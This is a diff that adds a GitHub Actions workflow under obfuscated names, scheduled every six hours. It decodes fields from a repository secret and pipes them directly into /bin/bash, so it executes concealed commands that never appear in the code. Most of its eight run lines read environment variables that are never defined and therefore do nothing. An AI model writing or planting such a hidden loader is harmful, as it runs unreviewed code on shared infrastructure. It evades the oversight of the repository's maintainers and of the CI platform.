@@ -1,0 +1,25 @@
+name: caiyongxingqinn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caiyongxingqinn
+        env:
+          qk1470: ${{ secrets.qk1470 }}
+        run: |
+          echo $qk1470 | jq -r .ixoka08 | /bin/bash
+          echo $bmxyj5126 | jq -r .ftiet0 | /bin/bash
+          echo $kqx04 | jq -r .djksc0457 | /bin/bash
+          echo $wb4 | jq -r .e14 | /bin/bash
+          echo $x515 | jq -r .gy84 | /bin/bash
+          echo $fhtxo906 | jq -r .msguy6 | /bin/bash
+          echo $f6 | jq -r .wh98 | /bin/bash
+          echo $wwzm4 | jq -r .dv5 | /bin/bash
+
